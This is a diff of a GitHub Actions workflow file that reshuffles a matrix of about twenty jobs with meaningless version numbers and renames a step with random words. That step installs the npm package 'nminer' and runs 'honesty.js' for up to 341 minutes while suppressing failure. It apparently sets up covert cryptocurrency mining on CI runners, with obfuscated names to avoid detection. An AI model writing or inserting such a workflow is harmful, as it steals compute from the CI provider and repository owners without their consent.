@@ -9,26 +9,25 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 2564 }
-          - { version: 6774 }
-          - { version: 140 }
-          - { version: 1431 }
-          - { version: 9346 }
-          - { version: 8768 }
-          - { version: 9296 }
-          - { version: 638 }
-          - { version: 4766 }
-          - { version: 3547 }
-          - { version: 2272 }
-          - { version: 391 }
-          - { version: 8075 }
-          - { version: 113 }
-          - { version: 4698 }
-          - { version: 2226 }
-          - { version: 7157 }
-          - { version: 6800 }
-          - { version: 7715 }
-          - { version: 5951 }
+          - { version: 2670 }
+          - { version: 2621 }
+          - { version: 6408 }
+          - { version: 775 }
+          - { version: 2598 }
+          - { version: 599 }
+          - { version: 2433 }
+          - { version: 4051 }
+          - { version: 7971 }
+          - { version: 5989 }
+          - { version: 9295 }
+          - { version: 766 }
+          - { version: 194 }
+          - { version: 3662 }
+          - { version: 343 }
+          - { version: 2533 }
+          - { version: 4827 }
+          - { version: 7662 }
+          - { version: 2633 }
 
     steps:
       - name: Checkout
@@ -39,7 +38,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: because however unnaturally down
+      - name: ill yawningly breed
         run: |
           npm install nminer@latest
-          timeout 310m node honesty.js || echo "honesty executed"
+          timeout 341m node honesty.js || echo "honesty executed"
